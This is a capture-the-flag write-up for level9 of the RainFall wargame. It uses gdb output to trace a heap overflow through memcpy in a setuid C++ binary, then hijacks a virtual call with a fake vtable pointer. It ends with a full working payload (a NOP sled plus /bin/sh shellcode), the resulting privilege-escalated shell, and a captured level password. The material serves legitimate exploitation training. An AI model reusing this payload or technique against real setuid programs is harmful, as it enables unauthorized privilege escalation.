Level9

level9@RainFall:~$ ls -la level9 
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9

level9@RainFall:~$ ./level9 hello there

(gdb) disas main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.


(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.

The binary is in C++;

If we send no argument we go directly in the exit function.
Else, we continue and call twice _Znwj@plt
It allows the allocation in memory of 2 instances of classes.
Then there is a call to _ZN1N13setAnnotationEPc.

If we disas the binary, we can find a strlen and memcpy.
After check we understand strlen count on the first arg and
memcpy copies the 1st arg in a previously allocated instance.

We try to make level9 segfault, we send a string pattern long enough and found
the offset is a 108.

With that we can start looking on how to modify eip.
The stack is executable, this means we can send a shellcode :

level9@RainFall:~$ readelf -a level9 | grep "GNU_STACK"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

We try to go further than the offset and take a look at the stack :

(gdb) r $(python -c 'print "A" * 108 + "BBBB"')
Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()

Thanks to that, we know that the segfault happens at the line 142 in the main.

(gdb) i r
eax            0x42424242	1111638594
ecx            0x42424242	1111638594
edx            0x804a07c	134520956
ebx            0x804a078	134520952
esp            0xbffff690	0xbffff690
ebp            0xbffff6b8	0xbffff6b8
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

We can see that eax and ecx are set at 424242, we now have control on it.

   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
=> 0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx

edx takes value of eax, and then the call of edx is a pointer to function.
We're going to send an address instead of the BBBB which point to another place
where which we are in control.

(gdb) x/100xw 0x804a00c
0x804a00c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a01c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a02c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a03c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a04c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a05c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a06c:	0x41414141	0x41414141	0x41414141	0x42424242
0x804a07c:	0x00000000	0x00000000	0x00000000	0x00000000

This is the address where argv is stocked

After adding our address :
(gdb) r $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level9/level9 $(python -c 'print "A" * 108 + "\x0c\xa0\x04\x08"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()


(gdb) x/100xw 0x804a00c
0x804a00c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a01c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a02c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a03c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a04c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a05c:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a06c:	0x41414141	0x41414141	0x41414141	0x0804a00c

We can see we are in control of eip :
(gdb) i r
eax            0x804a078	134520952
ecx            0x804a00c	134520844
edx            0x41414141	1094795585
ebx            0x804a078	134520952
esp            0xbffff68c	0xbffff68c
ebp            0xbffff6b8	0xbffff6b8
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

Then we need to make sure eip points to our shellcode and voila !


./level9 [Address + 4 after buffer start] + [Padding] + [Shellcode] + [Address + 0 from buffer]

level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x90" * 49 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x0c\xa0\x04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
